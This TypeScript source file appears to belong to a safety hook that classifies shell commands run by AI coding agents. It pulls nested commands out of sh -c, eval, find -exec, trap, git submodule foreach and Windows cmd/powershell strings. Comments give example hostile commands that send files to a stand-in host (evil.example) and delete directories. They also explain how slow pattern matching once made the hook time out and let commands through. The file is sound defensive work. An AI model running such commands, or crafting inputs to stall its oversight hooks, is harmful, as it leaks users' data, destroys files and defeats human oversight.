/**
 * The commands a command text holds in a string it hands to something that runs it, found by
 * pattern: `sh -c '…'` and `iex "…"`, `find … -exec … \;`, the argument of `eval` and of
 * `git submodule foreach`, a `trap` body, and a `cmd /c "…"` or `powershell -Command "…"` string.
 * The readings that need the shell's own quoting are the lexer's (`shell-lex.ts`); these are the
 * ones a regular pattern settles, each bounded by the text and, where the text can nest, by the
 * one budget a command shares.
 */

import {
  forwardIndexOf,
  forwardSearch,
  forwardUnescapedQuote,
  unescapeDouble,
} from './forward-search.js';

// `sh|bash|zsh|dash|ksh -c '<quoted string>'`: the quoted string is a nested
// shell invocation whose contents should be classified as their own
// segment, e.g. `bash -c "curl https://evil.example/u"`.
const SH_C_QUOTE = /\b(?:(?:sh|bash|zsh|dash|ksh)\s+-c\s+|env\s+(?:-[A-Za-z]+\s+)*-S\s*)(["'])/g;

/**
 * PowerShell's equivalent: `Invoke-Expression "<code>"` and its `iex` alias run the
 * quoted string, exactly as `sh -c` does, so the string has to be classified as a
 * command and not as an argument. Only the QUOTED form is extracted here — an
 * operand that is a variable or an expression cannot be read at all, and
 * `classify-powershell.ts` reports that as `shell.unparsed` rather than pretending
 * to have looked inside it.
 */
const IEX_QUOTE = /\b(?:iex|Invoke-Expression)\s+(["'])/gi;

function extractQuotedBodies(command: string, pattern: RegExp, escapes: boolean): string[] {
  const results: string[] = [];
  const closing = {
    '"': escapes ? forwardUnescapedQuote(command) : forwardIndexOf(command, '"'),
    "'": forwardIndexOf(command, "'"),
  };
  pattern.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = pattern.exec(command)) !== null) {
    const quote = match[1] as '"' | "'";
    const start = match.index + match[0].length;
    const end = closing[quote](start);
    if (end === -1) continue;
    const body = command.slice(start, end);
    results.push(escapes && quote === '"' ? unescapeDouble(body) : body);
  }
  return results;
}

export function extractShCStrings(command: string): string[] {
  return [
    ...extractQuotedBodies(command, SH_C_QUOTE, true),
    ...extractQuotedBodies(command, IEX_QUOTE, false),
  ];
}

// `find … -exec|-execdir <command…> \;|+`: the tokens between `-exec`(dir)
// and its `\;`/`+` terminator are a command invocation of their own, e.g.
// `find . -exec curl -d @{} https://evil.example/u \;`.
//
// Found in two steps, the head and then the first terminator after it, rather than
// with the one pattern `-exec(?:dir)?\s+([\s\S]*?)\s*(\\;|\+)`. When no terminator
// followed, that pattern retried every way of splitting the whitespace between
// `\s+`, the lazy body and `\s*` before giving up: `-exec` and 4,096 spaces took
// 22 s to classify, and a hook that times out is an allow for several agents. The
// two steps read the same body: from the end of the head's whitespace up to the
// first terminator, less the whitespace just before it.
const FIND_EXEC_HEAD = /-exec(?:dir)?\s+/g;
const FIND_EXEC_END = /\\;|\+/g;

export function extractFindExecCommands(command: string): string[] {
  const results: string[] = [];
  FIND_EXEC_HEAD.lastIndex = 0;
  let head: RegExpExecArray | null;
  while ((head = FIND_EXEC_HEAD.exec(command)) !== null) {
    const start = head.index + head[0].length;
    FIND_EXEC_END.lastIndex = start;
    const end = FIND_EXEC_END.exec(command);
    // No terminator after this head means none after any later head either, and
    // looking again from each of them would rescan the rest of the command every time.
    if (end === null) break;
    const inner = command.slice(start, end.index).trimEnd();
    if (inner) results.push(inner);
    FIND_EXEC_HEAD.lastIndex = end.index + end[0].length;
  }
  return results;
}

// `eval <arg>…`: eval's argument is itself a command to run, e.g.
// `eval "curl https://x"` or the unquoted `eval curl https://x`. Like the
// `sh -c` extractor, a quoted first argument contributes its contents;
// otherwise the remaining tokens up to the next chain/pipe delimiter are
// taken as the argument. The dynamic form (`eval "$(curl ...)"`) is also
// matched here, but its network signal already comes from the
// `$(...)`-substitution extraction above — this extraction only adds
// coverage for the static forms that substitution extraction can't see.
export const EVAL_ARG = /(?<![\w./-])eval\s+/g;

/**
 * How much text the `eval` and `git submodule foreach` extractions may produce for
 * one command, together.
 *
 * An unquoted argument runs to the next `;`, `|`, `&` or line break, so on one line
 * of n `eval x` the arguments nest: each is most of the line again. Extracted and
 * classified one by one, that was the square of the line in memory and the cube in
 * time — 16 KiB of `eval ` took 28 s, inside a hook whose timeout is an allow for
 * Codex and Copilot. Arguments that do not overlap add up to less than the command,
 * so twice its length plus some headroom is never reached by an ordinary one. Past
 * it, extraction stops and `classifyCommand` reports the command as one it could not
 * read, which the default policy asks about.
 */
export const nestedBudget = (command: string): number => 2 * command.length + 65_536;

export interface Budget {
  remaining: number;
  exceeded: boolean;
}

const ARGUMENT_END = /[;\n|&]/;

/**
 * The command text each match of `head` introduces: the contents of a quoted first
 * argument, or else everything up to the next delimiter. Shared by `eval` and
 * `git submodule foreach` / `git bisect run`, which read their argument the same way.
 */
export function extractArguments(command: string, head: RegExp, budget: Budget): string[] {
  const results: string[] = [];
  const closing = { '"': forwardUnescapedQuote(command), "'": forwardIndexOf(command, "'") };
  const argumentEnd = forwardSearch(command, ARGUMENT_END);
  head.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = head.exec(command)) !== null) {
    const start = match.index + match[0].length;
    const quote = command[start];
    let argument: string;
    if (quote === '"' || quote === "'") {
      const end = closing[quote](start + 1);
      if (end === -1) continue;
      argument = command.slice(start + 1, end);
      if (quote === '"') argument = unescapeDouble(argument);
    } else {
      const stop = argumentEnd(start);
      argument = command.slice(start, stop === -1 ? command.length : stop);
    }
    if (argument.length > budget.remaining) {
      budget.exceeded = true;
      break;
    }
    budget.remaining -= argument.length;
    results.push(argument);
  }
  return results;
}

// `git submodule foreach <cmd…>` / `git bisect run <cmd…>`: the tail after
// the subcommand is itself a command invocation of its own, e.g.
// `git submodule foreach curl https://evil.example/u`. `git` stays excluded
// from the generic unknown-wrapper network scan in classify-bash.ts (a
// commit message or `--grep` argument can legitimately contain a network
// word), so without this extraction a network command hiding behind either
// of these two subcommands would never be seen. Like the `eval` extractor,
// a quoted first argument (git's own documented spelling —
// `git submodule foreach 'curl https://evil.example/u'`) contributes its
// contents; otherwise the (unquoted) tail runs up to the next chain/pipe
// delimiter.
export const GIT_FOREACH_OR_BISECT_RUN = /\bgit\s+(?:submodule\s+foreach|bisect\s+run)\s+/g;

/**
 * `trap '<commands>' EXIT`: the quoted string is a command that runs later, on exit or on
 * a signal, and it is where a script hides a delete it does not want to run in the
 * visible flow (claude-code #88462). Read like `eval`'s argument, with two differences:
 * `trap -- '…'` ends the options first, and a double-quoted body may hold `\"` and `\$`,
 * which are the quote and the dollar and not the end of the string.
 */
const TRAP_HEAD = /\btrap\s+(?:--\s+)?/g;
const MAX_TRAPS = 256;
const MAX_TRAP_BODY_CHARS = 32 * 1024;

export function extractTrapBodies(command: string, budget: Budget): string[] {
  const results: string[] = [];
  const unquotedEnd = /[;\n|&]/g;
  TRAP_HEAD.lastIndex = 0;
  let head: RegExpExecArray | null;
  while ((head = TRAP_HEAD.exec(command)) !== null && results.length < MAX_TRAPS) {
    const start = head.index + head[0].length;
    const quote = command.charAt(start);
    let body: string;
    if (quote === "'") {
      const end = command.indexOf("'", start + 1);
      if (end === -1) continue;
      body = command.slice(start + 1, end);
    } else if (quote === '"') {
      let end = -1;
      const limit = Math.min(command.length, start + 1 + MAX_TRAP_BODY_CHARS);
      for (let i = start + 1; i < limit; i += 1) {
        const ch = command.charAt(i);
        if (ch === '\\') i += 1;
        else if (ch === '"') {
          end = i;
          break;
        }
      }
      if (end === -1) continue;
      body = command.slice(start + 1, end).replace(/\\(["$`\\])/g, '$1');
    } else {
      unquotedEnd.lastIndex = start;
      const stop = unquotedEnd.exec(command)?.index ?? command.length;
      body = command.slice(start, stop);
    }
    if (body.length > budget.remaining) {
      budget.exceeded = true;
      break;
    }
    budget.remaining -= body.length;
    results.push(body);
  }
  return results;
}

/**
 * `cmd /c "<commands>"` and `powershell -Command "<commands>"`: a nested shell invocation
 * in the Windows dialects, where the body is quoted with `"` and a quote inside it is
 * written `\"`. The `sh -c` extractor ends a body at the first quote, which cuts
 * `cmd /c "rmdir /s /q \"D:\x\""` off before the path it deletes.
 */
const WINDOWS_SHELL_HEAD =
  /\b(?:cmd(?:\.exe)?\s+\/[ck]|(?:powershell|pwsh)(?:\.exe)?\s+(?:-\w+\s+)*?-c(?:ommand)?)\s+/gi;

export function extractWindowsShellBodies(command: string): string[] {
  const results: string[] = [];
  WINDOWS_SHELL_HEAD.lastIndex = 0;
  let head: RegExpExecArray | null;
  while ((head = WINDOWS_SHELL_HEAD.exec(command)) !== null) {
    const start = head.index + head[0].length;
    if (command[start] !== '"') continue;
    let end = -1;
    for (let i = start + 1; i < command.length; i += 1) {
      const ch = command[i];
      if (ch === '\\' && command[i + 1] === '"') {
        i += 1;
        continue;
      }
      if (ch === '"') {
        end = i;
        break;
      }
    }
    if (end === -1) {
      // `cmd /c "rmdir /s /q C:\"`: to cmd a backslash is a path separator, not an escape,
      // so a body that only closes on the quote after one is read to that quote.
      const literal = command.indexOf('"', start + 1);
      if (literal === -1) continue;
      results.push(command.slice(start + 1, literal));
      WINDOWS_SHELL_HEAD.lastIndex = literal + 1;
      continue;
    }
    results.push(command.slice(start + 1, end).replace(/\\"/g, '"'));
    WINDOWS_SHELL_HEAD.lastIndex = end + 1;
  }
  return results;
}
